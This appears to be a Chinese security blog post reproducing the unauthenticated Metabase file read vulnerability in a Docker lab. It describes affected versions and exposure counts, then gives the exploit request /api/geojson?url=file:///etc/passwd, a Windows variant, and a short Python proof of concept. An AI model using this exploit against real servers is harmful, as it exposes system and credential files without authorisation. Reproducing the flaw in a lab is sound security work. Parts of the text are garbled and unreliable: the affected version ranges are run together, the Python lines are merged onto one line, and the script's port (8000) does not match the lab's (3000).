01

背景介绍





       近期, Metabase被爆出存在任意文件读取，攻击者可以在未经身份认证的情况下直接读取系统敏感文件。漏洞利用方式简单，影响较大，CVSS评分9.9，危害等级严重。




02

组件说明





       Metabase是美国Metabase公司的一个开源数据分析平台。

漏洞源于产品的 （admin-settings-maps-custom maps - add a map 操作缺少权限验证，攻击者可通过该漏洞获得系统敏感文件。


        影响版本：

metabase version < 0.40.51.0.0 <= metabase versionmetabaseversion < 1.40.5



03

漏洞分析





通过网络空间搜索引擎对【Metabase】进行搜索,存在 6774 条独立IP：

全球分布图如下：

美国最多为4357，其次为德国为548，中国为516.



环境搭建我们采用docker部署：

  • 目标靶机（mint Linux）：192.168.153.142

docker run -d -p 3000:3000 --name metabase metabase/metabase:v0.40.4

vulfocus已经集成了该漏洞的环境：

docker 部署完成后，访问首页：http://192.168.153.142:3000

开启burp访问漏洞路径：/api/geojson?url=file:///etc/passwd

（window机器访问：/api/geojson?url=file://c://windows/win.ini ）

部分代码如下：

import requests
url = "http://192.168.153.142:8000/api/geojson?url=file:///etc/passwd"res = requests.get(url = url)print(res.text)
